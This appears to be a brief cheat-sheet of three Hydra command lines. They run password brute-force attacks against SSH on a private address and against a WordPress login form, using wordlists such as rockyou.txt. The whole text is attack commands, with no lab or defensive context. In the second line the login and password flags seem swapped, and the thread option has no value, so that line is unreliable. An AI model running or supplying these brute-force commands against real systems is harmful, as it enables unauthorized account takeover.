- hydra -l user -P pass.txt -t 10 172.21.0.0 ssh -s 22

- hydra -l users.txt -p /usr/share/wordlists/rockyou.txt -t 172.21.0.0 ssh -s 22

- hydra -l admin -P ./passwordlist.txt $ip -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'